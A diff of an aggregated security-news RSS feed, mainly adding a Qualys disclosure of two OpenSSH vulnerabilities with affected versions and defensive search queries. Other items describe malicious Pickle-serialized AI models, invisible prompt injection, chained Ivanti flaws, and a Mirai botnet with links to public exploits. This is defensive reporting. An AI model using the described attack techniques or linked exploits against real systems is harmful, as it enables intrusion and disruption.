@@ -1,5 +1,198 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 18 Feb 2025 08:59:20 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, February 18th, 2025 https://isc.sans.edu/podcastdetail/9328</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Top Reasons Why Employees Are Using AI at Work</title><link>https://www.techrepublic.com/resource-library/feature/reasons-why-employees-are-using-ai-at-work/</link><description>Employees are motivated to use AI at work, regardless of company policy or training. But why? Kara Sherrer, writing for TechRepublic Premium, takes a deep dive into the research to investigate employees’ reasons for using AI at work. The feature also explores the most common ways that employees are currently using AI and some areas ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/top-reasons-why-employees-are-using-ai-at-work/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>ISC Stormcast For Tuesday, February 18th, 2025 https://isc.sans.edu/podcastdetail/9328, (Tue, Feb 18th)</title><link>https://isc.sans.edu/diary/rss/31694</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31694</guid></item><item><title>ModelScan - Protection Against Model Serialization Attacks, (Mon, Feb 17th)</title><link>https://isc.sans.edu/diary/rss/31692</link><description>&lt;p&gt;&lt;a href="https://protectai.com/"&gt;Protect AI&amp;#x27s&lt;/a&gt; OSS &lt;a href="https://github.com/protectai"&gt;portfolio&lt;/a&gt; includes tools aimed at improving security of AI/ML software. These tools are meant for a wide range of engineering, security and ML practitioners including developers, security engineers/researchers, ML engineers, LLM engineers and prompt engineers, and data scientists.&lt;br /&gt;&amp;#xd; Of particular interest in light of &lt;a href="https://github.com/protectai/modelscan/blob/main/docs/model&amp;#x5f;serialization&amp;#x5f;attacks.md"&gt;model serialization attacks&lt;/a&gt; is ModelScan.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;&lt;a href="https://protectai.com/"&gt;Protect AI&amp;rsquo;s&lt;/a&gt;&amp;nbsp;OSS&amp;nbsp;&lt;a href="https://github.com/protectai"&gt;portfolio&lt;/a&gt;&amp;nbsp;includes tools aimed at improving security of AI/ML software. These tools are meant for a wide range of engineering, security and ML practitioners including developers, security engineers/researchers, ML engineers, LLM engineers and prompt engineers, and data scientists.&lt;br /&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 18 Feb 2025 09:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, February 18th, 2025 https://isc.sans.edu/podcastdetail/9328</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Qualys TRU Discovers Two Vulnerabilities in OpenSSH: CVE-2025-26465 &amp; CVE-2025-26466</title><link>https://blog.qualys.com/category/vulnerabilities-threat-research</link><description>The Qualys Threat Research Unit (TRU) has identified two vulnerabilities in OpenSSH. The first, tracked as CVE-2025-26465, allows an active machine-in-the-middle attack on the OpenSSH client when the VerifyHostKeyDNS option is enabled. The second, CVE-2025-26466, affects both the OpenSSH client and server, enabling a pre-authentication denial-of-service attack. The attack against the OpenSSH client (CVE-2025-26465) succeeds [&amp;#8230;]</description><content:encoded>&lt;p&gt;The &lt;a href="https://www.qualys.com/tru/"&gt;Qualys Threat Research Unit (TRU)&lt;/a&gt; has identified two vulnerabilities in OpenSSH. The first, tracked as CVE-2025-26465, allows an active machine-in-the-middle attack on the OpenSSH client when the VerifyHostKeyDNS option is enabled. The second, CVE-2025-26466, affects both the OpenSSH client and server, enabling a pre-authentication denial-of-service attack.&lt;/p&gt;
+
+
+
+&lt;p&gt;The attack against the OpenSSH client (CVE-2025-26465) succeeds regardless of whether the VerifyHostKeyDNS option is set to “yes” or “ask” (its default is “no”), requires no user interaction, and does not depend on the existence of an SSHFP resource record (an SSH fingerprint) in DNS. VerifyHostKeyDNS is an OpenSSH client configuration option that lets the SSH client look up and verify a server’s host key using DNS records (specifically, SSHFP records). The vulnerability was introduced in December 2014, just before the release of OpenSSH 6.8p1. Although VerifyHostKeyDNS is disabled by default, it was enabled by default on FreeBSD from September 2013 until March 2023.&lt;/p&gt;
+
+
+
+&lt;p&gt;The OpenSSH client and server are vulnerable (CVE-2025-26466) to a pre-authentication denial-of-service attack–an asymmetric resource consumption of both memory and CPU–that was introduced in August 2023 (shortly before the release of OpenSSH 9.5p1). On the server side, this attack can be mitigated by leveraging existing mechanisms in OpenSSH, such as LoginGraceTime, MaxStartups, and the more recent PerSourcePenalties.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Recommended Action:&lt;/strong&gt; OpenSSH 9.9p2 addresses these vulnerabilities mentioned above. To ensure continued security, we strongly advise upgrading affected systems to 9.9p2 as soon as possible.&lt;/p&gt;
+
+
+
+&lt;span id="more-37293"&gt;&lt;/span&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="about-openssh-securing-enterprise-communications-and-infrastructure"&gt;&lt;strong&gt;About OpenSSH: Securing Enterprise Communications and Infrastructure&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;OpenSSH is a free, open-source implementation of the Secure Shell (SSH) protocol that enables encrypted communications over insecure networks. Widely adopted across Unix-like systems (including Linux and macOS) and many modern operating systems, it replaces clear-text protocols such as Telnet and FTP by providing secure remote login, file transfers, port forwarding, and tunneling.&lt;/p&gt;
+
+
+
+&lt;p&gt;With robust encryption, privilege separation, sandboxing, and modern memory allocators, OpenSSH minimizes the risk of memory-related vulnerabilities and unauthorized access. Its enterprise-grade scalability supports automated processes, data backups, and complex DevOps workflows—all while enforcing strong access controls. Despite these two vulnerabilities, OpenSSH’s overall track record in maintaining confidentiality and integrity has made it a benchmark in software security, ensuring secure communications for organizations worldwide.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="affected-openssh-versions"&gt;&lt;strong&gt;Affected OpenSSH versions:&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;OpenSSH versions from 6.8p1 through 9.9p1 are vulnerable to CVE-2025-26465, the flaw introduced in December 2014.&lt;/li&gt;
+
+
+
+&lt;li&gt;OpenSSH versions 9.5p1 through 9.9p1 are vulnerable to CVE-2025-26466, the flaw introduced in August 2023.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;OpenSSH 9.9p2 addresses the vulnerabilities mentioned above. Upgrade promptly to maintain security.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="potential-impact"&gt;&lt;strong&gt;Potential Impact&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;If an attacker can perform a man-in-the-middle attack via CVE-2025-26465, the client may accept the attacker’s key instead of the legitimate server’s key. This would break the integrity of the SSH connection, enabling potential interception or tampering with the session before the user even realizes it. SSH sessions can be a prime target for attackers aiming to intercept credentials or hijack sessions. If compromised, hackers could view or manipulate sensitive data, move across multiple critical servers laterally, and exfiltrate valuable information such as database credentials. Such breaches can lead to reputational damage, violate compliance mandates (e.g., GDPR, HIPAA, PCI-DSS), and potentially disrupt critical operations by forcing system downtime to contain the threat.&lt;/p&gt;
+
+
+
+&lt;p&gt;SSH is a critical service for remote system administration. If attackers can repeatedly exploit the flaw CVE-2025-26466, they may cause prolonged outages or prevent administrators from managing servers, effectively locking legitimate users out. An enterprise facing this vulnerability could see critical servers become unreachable, interrupting routine operations and stalling essential maintenance tasks.&lt;/p&gt;
+
+
+
+&lt;p&gt;When the Qualys research team confirmed the vulnerability, Qualys initiated a responsible disclosure process and worked with OpenSSH to coordinate its announcement.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="technical-details"&gt;&lt;strong&gt;Technical Details&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;You can find the technical details of this vulnerability at:&amp;nbsp;&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;a href="https://www.qualys.com/2025/02/18/openssh-mitm-dos.txt"&gt;https://www.qualys.com/2025/02/18/openssh-mitm-dos.txt&lt;/a&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="qualys-qid-coverage"&gt;&lt;strong&gt;Qualys QID Coverage&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;Qualys will release the QIDs by the end of the PST day. Once they become available, we will update the blog accordingly. Please refer to the Qualys Vulnerability Knowledgebase for a complete overview of these vulnerabilities and their coverage.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="discover-vulnerable-assets-using-qualys-cybersecurity-asset-management-csam"&gt;&lt;strong&gt;Discover Vulnerable Assets Using Qualys CyberSecurity Asset Management (CSAM)&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;The initial and crucial step in managing this critical vulnerability and mitigating associated risks involves pinpointing all assets susceptible to this specific issue. Use&amp;nbsp;&lt;a href="https://www.qualys.com/apps/cybersecurity-asset-management/"&gt;CSAM 3.0 with External Attack Surface Management&lt;/a&gt;&amp;nbsp;to identify your organization’s internet-facing instances that have vulnerable versions of OpenSSH or are at their End of Life (EOL) or End of Support (EOS).&lt;/p&gt;
+
+
+
+
+
+
+&lt;p&gt;In the following example, we aim to identify all assets running the OpenSSH for CVE-2025-26465 with the affected range: 6.8p1 through 9.9p1:&lt;/p&gt;
+
+
+
+&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background has-link-color wp-elements-508eed495859cbcf78daf2b3f899b417"&gt;software:(name:"openssh" AND version&amp;gt;=6.8 AND version&amp;lt;=9.9)&lt;/pre&gt;
+
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37307" height="457" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/Screenshot-2025-02-17-at-9.56.18 PM-1070x457.png" width="1070" /&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;In the following example, we aim to identify all assets running the OpenSSH for CVE-2025-26466 with the affected range: 9.5p1 through 9.9p1:&lt;/p&gt;
+
+
+
+&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background has-link-color wp-elements-1f1971852d6f7a8f43900871d7446512"&gt;software:(name:"openssh" AND version&amp;gt;=9.5 AND version&amp;lt;=9.9)&lt;/pre&gt;
+
+
+
+&lt;figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-1 is-layout-flex wp-block-gallery-is-layout-flex"&gt;
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37308" height="456" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/Screenshot-2025-02-17-at-9.57.26 PM-1070x456.png" width="1070" /&gt;&lt;/figure&gt;
+&lt;/figure&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="enhance-your-security-posture-with-qualys-vulnerability-management-detection-and-response-vmdr"&gt;&lt;strong&gt;Enhance Your Security Posture with Qualys Vulnerability Management, Detection, and Response (VMDR)&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;a href="https://www.qualys.com/apps/vulnerability-management-detection-response/"&gt;Qualys VMDR&lt;/a&gt;&amp;nbsp;offers comprehensive coverage and visibility into vulnerabilities, empowering organizations to rapidly respond to, prioritize, and mitigate the associated risks. Additionally, Qualys customers can leverage&amp;nbsp;&lt;a href="https://www.qualys.com/apps/patch-management/"&gt;Qualys Patch Management&lt;/a&gt;&amp;nbsp;to remediate these vulnerabilities effectively.&lt;/p&gt;
+
+
+
+&lt;p&gt;Leverage the power of Qualys VMDR alongside TruRisk and the Qualys Query Language (QQL) to efficiently identify and prioritize vulnerable assets, effectively addressing the vulnerabilities highlighted above.&lt;/p&gt;
+
+
+
+
+
+
+&lt;p&gt;Use this QQL statement:&lt;/p&gt;
+
+
+
+&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background has-link-color wp-elements-ffddcdf7ed6d6d85dc4bd13702c0f466"&gt;vulnerabilities.vulnerability.cveIds:CVE-2025-26465 or CVE-2025-26466&lt;/pre&gt;
+
+
+
+&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37310" height="510" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/Screenshot_2025-02-17_at_11_17_04 PM-1070x510.png" width="1070" /&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="automatically-patch-these-vulnerabilities-with-qualys-patch-management"&gt;Automatically Patch these vulnerabilities With Qualys Patch Management&lt;/h2&gt;
+
+
+
+&lt;p&gt;We expect vendors to release patches for this vulnerability shortly. Qualys Patch Management can&amp;nbsp; automatically deploy those patches to vulnerable assets, when available.&lt;/p&gt;
+
+
+
+&lt;p&gt;Customers can use the “patch now” button found to the right of the vulnerability to add these vulnerabilities to a patch job. Once patches are released, Qualys will find the relevant patches for these vulnerabilities and automatically add those patches to a patch job. This will allow customers to deploy those patches to vulnerable devices, all from the Qualys Cloud Platform.&lt;/p&gt;
+
+
+
+
+
+
+&lt;h2 class="wp-block-heading" id="detect-and-remediate-cve-2025-26466-and-cve-2025-26465-with-qualys-totalcloud-container-security"&gt;&lt;strong&gt;Detect and remediate CVE-2025-26466 and CVE-2025-26465 with Qualys TotalCloud Container Security&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;Qualys TotalCloud Container Security offers comprehensive coverage and visibility into vulnerabilities across all your container environments, including managed Kubernetes and on-premises Kubernetes. This empowers organizations to rapidly respond to, prioritize, and mitigate associated risks effectively.&lt;/p&gt;
+
+
+
+&lt;p&gt;Leverage the power of Qualys TotalCloud Container Security and the Qualys Query Language (QQL) to efficiently identify and prioritize vulnerable assets, ensuring prompt and effective remediation of the vulnerabilities highlighted by CVE-2025-26466 and CVE-2025-26465.&lt;/p&gt;
+
+
+
+&lt;p&gt;Use this QQL statement:&lt;/p&gt;
+
+
+
+&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background has-link-color wp-elements-1bb19a50e038d18c3f64147f56c8e878"&gt;state:`RUNNING` and vulnerabilities.cveids:CVE-2025-26466 or CVE-2025-26465&lt;/pre&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="conclusion"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p&gt;At Qualys, we strongly recommend that all customers and users upgrade to the latest version of OpenSSH to address potential security vulnerabilities. The OpenSSH project has a longstanding reputation for delivering secure remote access, and this new release underscores its commitment to protecting the user community. By upgrading, users gain access to critical security improvements and the most advanced features offered by the OpenSSH project. We want to thank the OpenSSH developers for their work on this release and their continued dedication to the OpenSSH project.&lt;/p&gt;
+
+
+
+&lt;p&gt;To stay up to date with our TRU team’s latest discoveries, &lt;a href="https://blog.qualys.com/"&gt;subscribe to our blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=37293</guid><category>Vulnerabilities and Threat Research</category><category>CVE-2025-26465</category><category>CVE-2025-26466</category><category>OpenSSH</category></item><item><title>Top Reasons Why Employees Are Using AI at Work</title><link>https://www.techrepublic.com/resource-library/feature/reasons-why-employees-are-using-ai-at-work/</link><description>Employees are motivated to use AI at work, regardless of company policy or training. But why? Kara Sherrer, writing for TechRepublic Premium, takes a deep dive into the research to investigate employees’ reasons for using AI at work. The feature also explores the most common ways that employees are currently using AI and some areas ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/top-reasons-why-employees-are-using-ai-at-work/</guid><category>Artificial Intelligence</category><category>IT Resources</category></item><item><title>ISC Stormcast For Tuesday, February 18th, 2025 https://isc.sans.edu/podcastdetail/9328, (Tue, Feb 18th)</title><link>https://isc.sans.edu/diary/rss/31694</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31694</guid></item><item><title>ModelScan - Protection Against Model Serialization Attacks, (Mon, Feb 17th)</title><link>https://isc.sans.edu/diary/rss/31692</link><description>&lt;p&gt;&lt;a href="https://protectai.com/"&gt;Protect AI&amp;#x27s&lt;/a&gt; OSS &lt;a href="https://github.com/protectai"&gt;portfolio&lt;/a&gt; includes tools aimed at improving security of AI/ML software. These tools are meant for a wide range of engineering, security and ML practitioners including developers, security engineers/researchers, ML engineers, LLM engineers and prompt engineers, and data scientists.&lt;br /&gt;&amp;#xd; Of particular interest in light of &lt;a href="https://github.com/protectai/modelscan/blob/main/docs/model&amp;#x5f;serialization&amp;#x5f;attacks.md"&gt;model serialization attacks&lt;/a&gt; is ModelScan.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;&lt;a href="https://protectai.com/"&gt;Protect AI&amp;rsquo;s&lt;/a&gt;&amp;nbsp;OSS&amp;nbsp;&lt;a href="https://github.com/protectai"&gt;portfolio&lt;/a&gt;&amp;nbsp;includes tools aimed at improving security of AI/ML software. These tools are meant for a wide range of engineering, security and ML practitioners including developers, security engineers/researchers, ML engineers, LLM engineers and prompt engineers, and data scientists.&lt;br /&gt;
 Of particular interest in light of&amp;nbsp;&lt;a href="https://github.com/protectai/modelscan/blob/main/docs/model_serialization_attacks.md"&gt;model serialization attacks&lt;/a&gt;&amp;nbsp;is ModelScan.&lt;/p&gt;
 
 &lt;p&gt;Headlines as recent as 6 FEB 2025 remind us that the popular Python Pickle serialization format, common for distributing AI models, offers attackers opportunities to inject malicious code to be executed when loading models with PyTorch.[1] See&amp;nbsp;&lt;a href="https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face"&gt;Malicious ML models discovered on Hugging Face platform&lt;/a&gt;. Post training, model&amp;rsquo;s mathematical representations can be stored in a variety of data serialization formats to be shared and reused without the need for additional model training. Pickle is a popular Python module used for serializing and deserializing ML model data. While easy to use, Pickle is considered an unsafe data format, as it allows Python code to be executed during ML model deserialization.[2]&lt;br /&gt;
@@ -6384,259 +6577,7 @@ e2221e5c58a1a976e59fe1062c6db36d4951b81e &amp;#8211; PHP file containing URL ass
 &lt;p&gt;One final note: The domain akam.ne has been registered previously &amp;#8212; in December 2016 by someone using the email address um-i-delo@yandex.ru. The Russian search giant Yandex reports this user account belongs to an &amp;#8220;Ivan I.&amp;#8221; from Moscow. Passive DNS records from &lt;a href="https://www.domaintools.com" rel="noopener" target="_blank"&gt;DomainTools.com&lt;/a&gt; show that between 2016 and 2018 the domain was connected to an Internet server in Germany, and that the domain was left to expire in 2018.&lt;/p&gt;
 &lt;p&gt;This is interesting given &lt;a href="https://www.linkedin.com/feed/update/urn:li:activity:7285038365236682753?commentUrn=urn%3Ali%3Acomment%3A%28activity%3A7285038365236682753%2C7285221445796835329%29&amp;amp;replyUrn=urn%3Ali%3Acomment%3A%28activity%3A7285038365236682753%2C7285223757982363648%29&amp;amp;dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287285221445796835329%2Curn%3Ali%3Aactivity%3A7285038365236682753%29&amp;amp;dashReplyUrn=urn%3Ali%3Afsd_comment%3A%287285223757982363648%2Curn%3Ali%3Aactivity%3A7285038365236682753%29" rel="noopener" target="_blank"&gt;a comment on Caturegli&amp;#8217;s LinkedIn post from an ex-Cloudflare employee&lt;/a&gt; who linked to a report he co-authored on a similar typo domain apparently registered in 2017 for organizations that may have mistyped their AWS DNS server as &amp;#8220;&lt;strong&gt;awsdns-06.ne&lt;/strong&gt;&amp;#8221; instead of &amp;#8220;&lt;strong&gt;awsdns-06.net&lt;/strong&gt;.&amp;#8221; DomainTools reports that this typo domain also was registered to a Yandex user (playlotto@yandex.ru), and was hosted at the same German ISP &amp;#8212; Team Internet (AS61969).&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70117</guid><category>A Little Sunshine</category><category>How to Break Into Security</category><category>akam.ne</category><category>akam.net</category><category>Akamai</category><category>awsdns-06.ne</category><category>az.mastercard.com</category><category>Azure</category><category>Bugcrowd</category><category>CloudFlare</category><category>google</category><category>mastercard</category><category>Philippe Caturegli</category><category>Seralys</category></item><item><title>How to Create a Secure Username</title><link>https://www.techrepublic.com/article/how-to-create-a-secure-username/</link><description>Discover how to create a unique and secure username for your online accounts, and find out why it’s just as important as having a strong password.</description><category>Cloud Security</category><category>Security</category><category>passwords</category><category>secure username</category><category>username</category></item><item><title>CISA and FBI Release Advisory on How Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications</title><link>https://www.cisa.gov/news-events/alerts/2025/01/22/cisa-and-fbi-release-advisory-how-threat-actors-chained-vulnerabilities-ivanti-cloud-service</link><description>&lt;p&gt;CISA, in partnership with the Federal Bureau of Investigation (FBI), released &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" title="Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications"&gt;Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications&lt;/a&gt;. This advisory was crafted in response to exploitation of vulnerabilities—&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" title="CVE-2024-8963 Detail"&gt;CVE-2024-8963&lt;/a&gt;, an administrative bypass vulnerability; &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9379" title="CVE-2024-9379 Detail"&gt;CVE-2024-9379&lt;/a&gt;, a SQL injection vulnerability; and &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" title="CVE-2024-8190 Detail"&gt;CVE-2024-8190&lt;/a&gt; and &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9380" title="CVE-2024-9380 Detail"&gt;CVE-2024-9380&lt;/a&gt;, remote code execution vulnerabilities—in Ivanti Cloud Service Appliances (CSA) in September 2024.&lt;/p&gt;
 &lt;p&gt;CISA, and the use of trusted third-party incident response data, found that threat actors chained the listed vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant webshells on victim networks.&lt;/p&gt;
-&lt;p&gt;CISA and FBI strongly encourage network administrators and defenders to upgrade to the latest supported version of Ivanti CSA and to hunt for malicious activity on their networks using the detection methods and indicators of compromise (IOCs) provided in the advisory. All members of the cybersecurity community are also encouraged to visit CISA’s &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt; to help better manage vulnerabilities and keep pace with threat activity. For more information and guidance on protection against the most common and impactful threats, tactics, techniques, and procedures, visit CISA’s &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals"&gt;Cross-Sector Cybersecurity Performance Goals&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/22898</guid></item><item><title>Invisible Prompt Injection: A Threat to AI Security</title><link>https://www.trendmicro.com/en_us/research/25/a/invisible-prompt-injection-secure-ai.html</link><description>This article explains the invisible prompt injection, including how it works, an attack scenario, and how users can protect themselves.</description><guid isPermaLink="false">urn:uuid:82ec137d-6724-576d-02bd-64a68c66e576</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Mass Campaign of Murdoc Botnet Mirai: A New Variant of Corona Mirai</title><link>https://blog.qualys.com/category/vulnerabilities-threat-research</link><description>The Qualys Threat Research Unit has uncovered a large-scale, ongoing operation within the Mirai campaign, dubbed Murdoc Botnet. This variant exploits vulnerabilities targeting AVTECH Cameras and Huawei HG532 routers. It demonstrates enhanced capabilities, exploiting vulnerabilities to compromise devices and establish expansive botnet networks. In this blog, we will explore Murdoc Botnet’s propagation methods and attack [&amp;#8230;]</description><content:encoded>&lt;p&gt;The Qualys Threat Research Unit has uncovered a large-scale, ongoing operation within the Mirai campaign, dubbed Murdoc Botnet. This variant exploits vulnerabilities targeting AVTECH Cameras and Huawei HG532 routers. It demonstrates enhanced capabilities, exploiting vulnerabilities to compromise devices and establish expansive botnet networks. In this blog, we will explore Murdoc Botnet’s propagation methods and attack vectors.&lt;/p&gt;
-
-
-
-&lt;span id="more-37108"&gt;&lt;/span&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="overview-of-the-latest-murdoc-botnet-campaign-and-a-historical-timeline"&gt;Overview of the latest Murdoc Botnet campaign and a historical timeline&lt;/h2&gt;
-
-
-
-&lt;p&gt;In this latest campaign we note the utilization of ELF file and Shell Script execution, which leads to the deployment of the botnet sample. This technique was already seen in 2024 when the attackers exploited the same vulnerabilities to load their malware payload on the targeted devices.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image1.png"&gt;&lt;img alt="" class="wp-image-37109" height="407" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image1.png" width="1429" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1: Attack timeline&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;The diagram above conveys the percentage of increased and decreased attacks per month relative to the previous month.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="technical-campaign-analysis"&gt;Technical campaign analysis&lt;/h2&gt;
-
-
-
-&lt;p&gt;During routine hunting analysis, the Qualys Threat Research team uncovered evidence of an ongoing live campaign for Mirai, which commenced in July 2024.&lt;/p&gt;
-
-
-
-&lt;p&gt;With the help of the below FOFA query, we discovered that around 1300+ IPs were &amp;nbsp;found active on this campaign.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image2.png"&gt;&lt;img alt="" class="wp-image-37110" height="1045" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image2.png" width="1429" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2: FOFA Query&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="command-and-control-analysis"&gt;Command-and-control analysis&lt;/h2&gt;
-
-
-
-&lt;p&gt;The Qualys Threat Research Team uncovered the presence of 100+ distinct sets of servers, each tasked with deciphering its activities and establishing communication with one of the compromised IPs implicated in this ongoing campaign. These servers facilitated the distribution of Mirai malware.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image3.png"&gt;&lt;img alt="" class="wp-image-37111" height="798" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image3.png" width="1410" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3: Embedded payloads&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;The above-mentioned figure shows the complete details of identified command-and-control servers, with respective payload content to the final URL, which drops the Mirai malware.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="murdoc-botnet"&gt;Murdoc Botnet&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/h2&gt;
-
-
-
-&lt;p&gt;Mirai malware, here dubbed as Murdoc Botnet, is a prominent malware family for *nix systems. It mainly targets vulnerable AVTECH and Huawei devices. This botnet also uses some existing exploits (&lt;a href="https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Exploits/avtech.py"&gt;CVE-2024-7029&lt;/a&gt;, &lt;a href="https://www.exploit-db.com/exploits/43414"&gt;CVE-2017-17215&lt;/a&gt;) to download the next-stage payloads.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image4.png"&gt;&lt;img alt="" class="wp-image-37112" height="297" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image4.png" width="707" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4: Huawei Exploit inside binary (CVE-2017-17215)&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;
-
-
-
